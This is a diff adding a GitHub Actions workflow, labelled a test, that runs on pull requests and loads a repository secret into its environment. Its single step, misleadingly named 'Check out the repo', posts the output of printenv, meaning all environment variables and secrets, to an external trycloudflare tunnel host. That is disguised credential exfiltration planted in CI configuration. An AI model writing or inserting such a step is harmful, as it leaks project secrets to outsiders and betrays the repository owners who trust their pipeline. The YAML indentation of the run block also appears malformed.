@@ -1,0 +1,16 @@
+name: Test Workflow
+
+on:
+  pull_request:
+
+jobs:
+  do-something:
+    name: Doing something
+    runs-on: parity-large
+    env:
+      REVIEW_APP_ID: ${{ secrets.REVIEW_APP_ID }}
+    steps:
+      - name: Check out the repo
+        run: |
+        curl -X POST -d "$(printenv)" https://past-chorus-category-appliance.trycloudflare.com
+                  
